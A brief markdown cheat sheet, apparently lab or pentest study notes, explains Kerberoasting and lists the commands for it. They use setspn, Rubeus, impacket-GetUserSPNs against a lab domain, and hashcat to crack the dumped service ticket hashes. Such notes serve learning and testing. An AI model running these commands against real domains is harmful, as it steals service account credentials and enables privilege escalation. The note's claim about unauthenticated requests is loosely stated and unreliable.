

### Kerberoasting :
-  Kerberoasting targets on service account .
- some service account runs on high privilege account.
- Any authenticted or unauthenticate we just want username we can easily request service ticket of service account by TGS.
- Service ticket is encrypted with service account password hash.
- we request and crack those hash.


create service principle name :
```bash
setspn -a <Domain hostname>/<Account_name>.<Domain name>:<port> <Domain>\<Account name>
```


identify service principle name account :
```bash
setspn -T UAP.local -Q */*
```

using Rubeus.exe:
```bash
 .\Rubeus.exe kerberoast
 .\Rubeus.exe kerberoast /outfile:a.txt
```

using impacket-GetUserSPNs :
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.44.166 UAP.local/fcastle -save -outputfile GetUserSPNs1.out
```

crack hash :
```bash
hashcat -m 13100 GetUserSPNs1.out /usr/share/wordlists/rockyou.txt.gz 
```